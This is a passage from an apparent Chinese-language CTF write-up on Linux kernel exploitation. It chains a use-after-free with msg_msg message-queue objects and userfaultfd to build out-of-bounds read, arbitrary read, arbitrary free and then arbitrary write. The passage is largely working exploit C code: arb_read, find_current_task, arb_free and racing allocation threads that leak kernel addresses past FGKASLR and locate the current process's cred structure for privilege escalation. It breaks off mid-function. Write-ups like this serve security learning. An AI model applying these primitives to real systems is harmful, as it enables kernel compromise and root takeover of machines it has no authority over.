<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">[...]
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#8fa1b3;">recv_msg</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">qid</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*memdump = </span><span style="color:#96b5b4;">malloc</span><span style="color:#c0c5ce;">(size);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">msgrcv</span><span style="color:#c0c5ce;">(qid, memdump, size, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, IPC_NOWAIT | MSG_COPY | MSG_NOERROR) == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">msgrcv</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> memdump;
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">[...]
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">uint64_t *</span><span style="color:#8fa1b3;">arb_read</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">, uint64_t </span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">overwrite</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> evil_msg *msg = (</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> evil_msg *)</span><span style="color:#96b5b4;">malloc</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    msg-&gt;m_type =  </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    msg-&gt;m_ts = size; </span><span style="color:#65737e;">// [2]
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(overwrite)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        msg-&gt;next = target;
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">edit_rule</span><span style="color:#c0c5ce;">(idx, (</span><span style="color:#b48ead;">unsigned char </span><span style="color:#c0c5ce;">*)msg, OUTBOUND, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">else
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">edit_rule</span><span style="color:#c0c5ce;">(idx, (</span><span style="color:#b48ead;">unsigned char </span><span style="color:#c0c5ce;">*)msg, OUTBOUND, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">); </span><span style="color:#65737e;">// [3]
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">free</span><span style="color:#c0c5ce;">(msg);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">recv_msg</span><span style="color:#c0c5ce;">(qid[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">], size); </span><span style="color:#65737e;">// [4]
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">[...]
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">uint64_t *leak = </span><span style="color:#8fa1b3;">arb_read</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x2000</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">); </span><span style="color:#65737e;">// [1]
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">[...]
</span></pre>
<p>接着利用UAF修改<code>qid[0]</code>的<code>msg_header</code>的<code>m_ts</code>为0x2000</p>
<p><img src="https://md.buptmerak.cn/uploads/c6c611a1-585a-48c4-978a-f85faa110649.png" alt="" /></p>
<p><img src="https://md.buptmerak.cn/uploads/925a9400-e9a6-4c87-bfaa-cb2c98e6eda6.png" alt="" /></p>
<p>然后就可以通过<code>msg_rcv</code>越界读取堆上的数据。当<code>qid[1]</code>的第一条消息就位于<code>qid[0]</code>下方，且<code>msg</code>结构体中有链接<code>qid[1]</code>第二条消息的指针，因此可以读取得到<code>qid[1]</code>第二条消息的地址；同时读取到<code>sysfs_bin_kfops_ro</code>后可以计算出<code>init_task</code>地址（也可以读<code>dynamic_kobj_ktype</code>，更稳定）</p>
<p><img src="https://md.buptmerak.cn/uploads/478f9f2d-454a-4486-8c2b-d9f7aaa54a55.png" alt="" /></p>
<blockquote>
<p>sysfs_bin_kfops_ro comes from mounting /sys in the init file. The symbol is there because the system is virtually noise-free: no other objects have been allocated since system startup、
sysfs_bin_kfops_ro来自在初始化文件中挂载/sys，由于系统实际上是无噪声的所以该符号在那（自系统启动以来没有分配过任何其他对象）
sysfs_bin_kfops_ro belongs to the kernel data section and it is not affected by FGKASLR, so we can use it to calculate the kernel base address, or to calculate addresses of other symbols in the data section.
sysfs_bin_kfops_ro属于内核数据区，不受FGKASLR影响，所以可以通过它来计算内核基址，或计算内核数据区中其他符号的地址</p>
</blockquote>
<h3 id="cong-yue-jie-du-dao-ren-yi-du">从越界读到任意读</h3><pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">[...]
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">uint64_t </span><span style="color:#8fa1b3;">find_current_task</span><span style="color:#c0c5ce;">(uint64_t </span><span style="color:#bf616a;">init_task</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    pid_t pid, next_task_pid;
</span><span style="color:#c0c5ce;">    uint64_t next_task;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    pid = </span><span style="color:#8fa1b3;">getpid</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Current task PID: </span><span style="color:#d08770;">%d</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, pid);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] Traversing tasks...</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">// 跳过第一块msg，索引到next指向的值
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">// 这里+0x1f9实际上是留了8字节给前面+8跳过的8字节，从而偏移不变
</span><span style="color:#c0c5ce;">    leak = </span><span style="color:#8fa1b3;">arb_read</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, init_task + </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x1500</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) + </span><span style="color:#d08770;">0x1f9</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    next_task = leak[</span><span style="color:#d08770;">0x298</span><span style="color:#c0c5ce;">/</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">] - </span><span style="color:#d08770;">0x298</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    leak = </span><span style="color:#8fa1b3;">arb_read</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, next_task + </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x1500</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) + </span><span style="color:#d08770;">0x1f9</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    next_task_pid = leak[</span><span style="color:#d08770;">0x398</span><span style="color:#c0c5ce;">/</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">(next_task_pid != pid) </span><span style="color:#65737e;">// [2]
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        next_task = leak[</span><span style="color:#d08770;">0x298</span><span style="color:#c0c5ce;">/</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">] - </span><span style="color:#d08770;">0x298</span><span style="color:#c0c5ce;">; </span><span style="color:#65737e;">// [3]
</span><span style="color:#c0c5ce;">        leak = </span><span style="color:#8fa1b3;">arb_read</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, next_task + </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x2000</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) + </span><span style="color:#d08770;">0x1f9</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        next_task_pid = leak[</span><span style="color:#d08770;">0x398</span><span style="color:#c0c5ce;">/</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">]; </span><span style="color:#65737e;">// [4]
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Current task found!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> next_task;
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">[...]
</span><span style="color:#c0c5ce;">
</span><span style="color:#8fa1b3;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] Locating current task address...</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">uint64_t current_task = </span><span style="color:#8fa1b3;">find_current_task</span><span style="color:#c0c5ce;">(init_task); </span><span style="color:#65737e;">// [1]
</span><span style="color:#8fa1b3;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Leaked current task address: 0x</span><span style="color:#d08770;">%lx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, current_task);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">[...]
</span></pre>
<p>首先找到当前<code>task</code>结构体，任意读方法在上一题分析中提过，即利用UAF修改<code>next</code>指针，读取0x1500字节数据，并跳过前0x1000-0x30字节，之后就是对应的<code>next</code>指向的内容（并控制<code>next</code>指向NULL指针，使<code>msg_msgeg</code>的<code>next</code>为空）</p>
<p>寻找当前<code>task</code>的方法也和前文一样，<code>task</code>内部有双向指针链接，通过其对所有<code>task</code>遍历，找到与当前<code>pid</code>一致的<code>task</code></p>
<p><img src="https://md.buptmerak.cn/uploads/29524042-b809-4fd0-b94d-736731841807.png" alt="" /></p>
<p>找到当前<code>task</code>后，读取当前<code>cred</code>结构体的地址</p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">// 0x1fa*8=0xfd0
</span><span style="color:#c0c5ce;">leak = </span><span style="color:#8fa1b3;">arb_read</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, current_task, </span><span style="color:#d08770;">0x2000</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) + </span><span style="color:#d08770;">0x1fa</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">cred_struct = leak[</span><span style="color:#d08770;">0x540</span><span style="color:#c0c5ce;">/</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">];
</span><span style="color:#8fa1b3;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Leaked current task cred struct: 0x</span><span style="color:#d08770;">%lx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, cred_struct);
</span></pre>
<p><img src="https://md.buptmerak.cn/uploads/81923f0d-a7cf-49a6-a62f-21ba18e47021.png" alt="" /></p>
<h3 id="ren-yi-di-zhi-shi-fang">任意地址释放</h3><p>任意释放可以通过两次不带<code>MSG_COPY</code>flag的<code>msgrcv()</code>获得</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">[...]
</span><span style="color:#c0c5ce;">
</span><span style="color:#8fa1b3;">msgrcv</span><span style="color:#c0c5ce;">(qid[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">], memdump, </span><span style="color:#d08770;">0x1ff8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, IPC_NOWAIT | MSG_NOERROR); </span><span style="color:#65737e;">// [1]
</span><span style="color:#8fa1b3;">msgrcv</span><span style="color:#c0c5ce;">(qid[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">], memdump, </span><span style="color:#d08770;">0x1ff8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, IPC_NOWAIT | MSG_NOERROR); </span><span style="color:#65737e;">// [2]
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">[...]
</span></pre>
<p>第一次执行<code>msgrcv()</code>，内核会释放属于<code>qid[1]</code>的第一个消息（kmalloc-64）；再次调用时，会释放第二个消息（kmalloc-4k）和它各自的<code>segment</code>。内存结果如下图所示</p>
<p><img src="https://md.buptmerak.cn/uploads/905648f9-0f5b-490a-81a9-9d754b3b1be5.png" alt="" /></p>
<p>在上面过程中，<code>free_msg</code>将kmalloc-4k的消息和它的segment释放了</p>
<p>由于空闲链表先进后出，当在kmalloc-4k中申请一个新的<code>message</code>和其对应的<code>segment</code>时，新的<code>message</code>会占用原来<code>segment</code>的位置，而新的<code>segment</code>则会占用原来<code>message</code>的位置，也就是说当释放后再次申请相应大小时，二者的位置互换了。而我们前面已经泄露了<code>message</code>的地址，也即新的<code>segment</code>的地址</p>
<p>如下示意图，我们已知绿色chunk的地址</p>
<p><img src="https://md.buptmerak.cn/uploads/97dcb4d2-04c2-453b-a597-0967829749be.png" alt="" /></p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">[...]
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#8fa1b3;">allocate_msg1</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">_</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[Thread 1] Message buffer allocated at 0x</span><span style="color:#d08770;">%lx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, page_1 + PAGE_SIZE - </span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((qid[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">] = </span><span style="color:#8fa1b3;">msgget</span><span style="color:#c0c5ce;">(IPC_PRIVATE, </span><span style="color:#d08770;">0666 </span><span style="color:#c0c5ce;">| IPC_CREAT)) == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) </span><span style="color:#65737e;">// [2]
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">msgget</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(page_1, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, PAGE_SIZE);
</span><span style="color:#c0c5ce;">    ((</span><span style="color:#b48ead;">unsigned long </span><span style="color:#c0c5ce;">*)(page_1))[</span><span style="color:#d08770;">0xff0 </span><span style="color:#c0c5ce;">/ </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">] = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">msgsnd</span><span style="color:#c0c5ce;">(qid[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">], page_1 + PAGE_SIZE - </span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x1ff8 </span><span style="color:#c0c5ce;">- </span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) </span><span style="color:#65737e;">// [3]
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">msgsend failed!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">msgsnd</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[Thread 1] Message sent, *next overwritten!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">[...]
</span><span style="color:#c0c5ce;">
</span><span style="color:#8fa1b3;">pthread_create</span><span style="color:#c0c5ce;">(&amp;tid[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, allocate_msg1, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">); </span><span style="color:#65737e;">// [1]
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">[...]
</span></pre>
<p>现在使用<code>pthread_create</code>申请新消息队列<code>qid[2]</code>的<code>message</code>和其<code>segment</code>。0x1ff8字节（0x30为header，0x1fc8为data），内核会在kmalloc-4k分配一个0x1000字节的<code>message</code>（0x30的header和0xfd0的data），和一个同样在kmalloc-4k分配的0x1000字节的<code>segment</code>（0x8字节的next指针和0xff8字节的data）</p>
<p><code>page_1 + PAGE_SIZE - 0x10</code>用了<code>userfaultfd</code>进行监控，等待缺页</p>
<p>当<code>load_msg()</code>尝试复制消息到内核中时，造成缺页，此时能够在<code>copy_from_user()</code>操作期间挂起内核线程</p>
<p>此时内核内存布局如下</p>
<p><img src="https://md.buptmerak.cn/uploads/387b4fb1-0723-4a7f-bcea-4444cabb23dd.png" alt="" /></p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">[...]
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">arb_free</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">, uint64_t </span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> evil_msg *msg = (</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> evil_msg *)</span><span style="color:#96b5b4;">malloc</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*memdump = </span><span style="color:#96b5b4;">malloc</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x2000</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    msg-&gt;m_list.</span><span style="color:#bf616a;">next </span><span style="color:#c0c5ce;">= queue; </span><span style="color:#65737e;">// [2]
</span><span style="color:#c0c5ce;">    msg-&gt;m_list.</span><span style="color:#bf616a;">prev </span><span style="color:#c0c5ce;">= queue;
</span><span style="color:#c0c5ce;">    msg-&gt;m_type =  </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    msg-&gt;m_ts = </span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    msg-&gt;next = target; </span><span style="color:#65737e;">// [3]
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">edit_rule</span><span style="color:#c0c5ce;">(idx, (</span><span style="color:#b48ead;">unsigned char </span><span style="color:#c0c5ce;">*)msg, OUTBOUND, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">); </span><span style="color:#65737e;">// [4]
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] Triggering arb free...</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">msgrcv</span><span style="color:#c0c5ce;">(qid[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">], memdump, </span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, IPC_NOWAIT | MSG_NOERROR); </span><span style="color:#65737e;">// [5]
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Target freed!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">free</span><span style="color:#c0c5ce;">(memdump);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">free</span><span style="color:#c0c5ce;">(msg);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">[...]
</span><span style="color:#c0c5ce;">
</span><span style="color:#8fa1b3;">arb_free</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, large_msg); </span><span style="color:#65737e;">// [1]
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">[...]
</span></pre>
<p>接着就能执行<code>free</code>原语了。<code>arb_free()</code>函数是用来释放新的<code>segment</code>的。利用之前泄露的<code>queue</code>指针填回原处，防止<code>message</code>在解链时crash，同时将<code>next</code>指针设置为目标地址：kmalloc-4k中新的<code>segment</code>。利用UAF修改<code>header</code>后内存如下</p>
<p><img src="https://md.buptmerak.cn/uploads/a17c5982-3c1c-4a80-b1cf-fb4e9d35f641.png" alt="" /></p>
<p>然后调用<code>msgrecv()</code>释放<code>qid[0]</code>的message。注意源码中当对<code>msg</code>执行<code>free_msg</code>时，不会判断其size，而是将<code>msg_header</code>和链接的所有<code>segment</code>全部释放掉。故这里会将<code>qid[0]</code>自己的<code>msg_msg</code>和利用UAF链上的新的<code>segment</code>都释放掉</p>
<p><img src="https://md.buptmerak.cn/uploads/0622cc4a-f745-4da2-bf89-951a12698835.png" alt="" /></p>
<h3 id="cong-ren-yi-di-zhi-shi-fang-dao-ren-yi-di-zhi-xie">从任意地址释放到任意地址写</h3><p>现在创建一个新的线程，申请另一个<code>message</code>占用刚刚释放掉的内存</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">[...]
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#8fa1b3;">allocate_msg2</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">_</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[Thread 2] Message buffer allocated at 0x</span><span style="color:#d08770;">%lx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, page_2 + PAGE_SIZE - </span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((qid[</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">] = </span><span style="color:#8fa1b3;">msgget</span><span style="color:#c0c5ce;">(IPC_PRIVATE, </span><span style="color:#d08770;">0666 </span><span style="color:#c0c5ce;">| IPC_CREAT)) == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) </span><span style="color:#65737e;">// [2]
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">msgget</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(page_2, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, PAGE_SIZE);
</span><span style="color:#c0c5ce;">    ((</span><span style="color:#b48ead;">unsigned long </span><span style="color:#c0c5ce;">*)(page_2))[</span><span style="color:#d08770;">0xff0 </span><span style="color:#c0c5ce;">/ </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">] = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">msgsnd</span><span style="color:#c0c5ce;">(qid[</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">], page_2 + PAGE_SIZE - </span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x1028 </span><span style="color:#c0c5ce;">- </span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) </span><span style="color:#65737e;">// [3]
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">msgsend failed!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">msgsnd</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
